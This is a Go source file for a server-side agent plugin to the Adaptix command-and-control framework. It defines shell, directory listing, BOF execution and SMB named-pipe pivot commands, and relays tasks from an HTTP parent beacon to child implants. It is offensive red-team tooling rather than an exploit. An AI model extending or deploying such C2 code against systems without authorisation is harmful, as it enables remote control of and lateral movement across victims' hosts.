package main

import (
	"fmt"
	"sync"

	ax "github.com/Adaptix-Framework/axc2/v2"
)

const (
	CMD_EXIT  = 0x01
	CMD_SHELL = 0x02
	CMD_PWD   = 0x03
	CMD_LS    = 0x04
	CMD_BOF   = 0x05
	CMD_LINK  = 0x06
	CMD_PIVOT = 0x07 // parent relays tasks to SMB child

	// Magic prefix byte in a CMD_LINK result: signals "this is a child checkin blob".
	LINK_MAGIC = 0x4C // 'L'

	// Magic prefix byte in a CMD_PIVOT result: [0x50][36B child_uuid][encrypted_body]
	PIVOT_RESULT_MAGIC = 0x50 // 'P'

	// Magic prefix byte when the HTTP parent's child pipe broke: [0x44][36B child_uuid]
	PIVOT_DEAD_MAGIC = 0x44 // 'D'

	// Confirmation byte sent by Task_Exit before the agent terminates.
	EXIT_MAGIC = 0x45 // 'E'

	// Unlink a named-pipe child session.
	CMD_UNLINK = 0x08

	// Name of the SMB listener plugin as declared in listener_pain_smb/config.yaml.
	SMB_LISTENER_NAME = "PainSMB"

	OS_WINDOWS = 1

	TYPE_TASK = 1

	MESSAGE_INFO    = 5
	MESSAGE_ERROR   = 6
	MESSAGE_SUCCESS = 7
)

// Teamserver connectivity code

// Teamserver interface
type Teamserver interface {
	TsTaskUpdate(agentId int64, updateData ax.TaskData)

	// Used by the link command to register child SMB agents directly.
	TsAgentIdByUID(uid []byte) (int64, bool)
	TsAgentCreate(agentCrc string, agentUid []byte, beat []byte, listenerName string, externalIP string, async bool) (ax.AgentData, error)
	TsAgentSetTick(agentId int64, listenerName string) error

	// Used by the pivot relay loop to route child results and register parent-child links.
	TsAgentProcessData(agentId int64, bodyData []byte) error
	TsPivotCreate(pivotId string, pAgentId int64, chAgentId int64, pivotName string, isRestore bool) error
	TsAgentTerminate(agentId int64, terminateTaskId int64) error

	// Inject a task into an agent's hosted queue (used for SMB heartbeat placeholders).
	TsTaskCreate(agentId int64, cmdline string, client string, taskData ax.TaskData)

	// Print a message in an agent's console (used to notify the HTTP parent when its SMB child dies).
	TsAgentConsoleOutput(agentId int64, client string, messageType int, message string, clearText string, store bool)
}

// PivotMap maps the 36-char child agent UUID to its Adaptix agent ID.
var PivotMap sync.Map // key: string(36-char uuid) → value: int64(childAgentId)

// PivotParentMap maps child UUID to the HTTP parent's agent ID (for console notifications).
var PivotParentMap sync.Map // key: string(36-char uuid) → value: int64(parentAgentId)

// PivotChildMap is the reverse of PivotMap - lets unlink/exit handlers find the UUID from the agent ID.
var PivotChildMap sync.Map // key: int64(childAgentId) → value: string(36-char uuid)

// PluginAgent handles check-in and build - one per agent TYPE (not per agent instance)
type PluginAgent struct{}

// ModuleExtender groups everything the plugin needs at runtime
type ModuleExtender struct {
	ts Teamserver // call back into the teamserver
	pa *PluginAgent
}

// ModuleObject is the Single Global instance of the plugin
// InitPlugin creates it. Every method calls into it
var (
	ModuleObject *ModuleExtender
	ModuleDir    string
	SrcPath      = "src_agent" // agent source tree symlinked by setup_pain.sh
)

// InitPlugin is the only exported symbol in the plugin
// Adaptix server loads the .so file
// This must return a PluginAgent the implements the as.PluginAgent interface
func InitPlugin(ts any, moduleDir string, watermark string) ax.PluginAgent {
	ModuleDir = moduleDir

	ModuleObject = &ModuleExtender{
		ts: ts.(Teamserver),
		pa: &PluginAgent{},
	}

	return ModuleObject.pa
}

// AgentRestore is called when the server restarts and reloads a saved agent.
// We return the same function set as a fresh agent.
func (pa *PluginAgent) AgentRestore(agentData ax.AgentData) ax.AgentFunctions {
	return newAgentFunctions()
}

// Call handles custom UI→plugin RPC. Not needed yet.
func (pa *PluginAgent) Call(operator string, agentId int64, function string, args string) {}

// pivotPackData is called by Adaptix's extractPivotTasks when there are tasks
// pending for an SMB child. We pack them as CMD_PIVOT so the HTTP parent beacon
// relays them to the child via the named pipe.
// pivotId = 36-char child UUID we passed to TsPivotCreate.
func pivotPackData(pivotId string, data []byte) (ax.TaskData, error) {
	if len(data) == 0 {
		return ax.TaskData{}, fmt.Errorf("no pending tasks for child %s", pivotId)
	}

	// Tick the child at relay START so the UI countdown resets immediately.
	// A second tick fires at relay END (processData PIVOT_RESULT handler).
	// Together they keep the child's displayed interval ≈ child.Sleep.
	if val, ok := PivotMap.Load(pivotId); ok {
		_ = ModuleObject.ts.TsAgentSetTick(val.(int64), SMB_LISTENER_NAME)
	}

	// Args: [str pivot_uuid][bytes relay_data]
	argPacker := NewPacker()
	argPacker.WriteStr(pivotId)
	argPacker.WriteBytes(data)

	// Full task data: [4B CMD_PIVOT][4B+N args]
	taskData := buildTaskPacket(CMD_PIVOT, argPacker.Bytes())

	return ax.TaskData{
		Type: ax.TASK_TYPE_PROXY_DATA,
		Data: taskData,
	}, nil
}

// main is required for go build -buildmode-plugin but never called
func main() {}
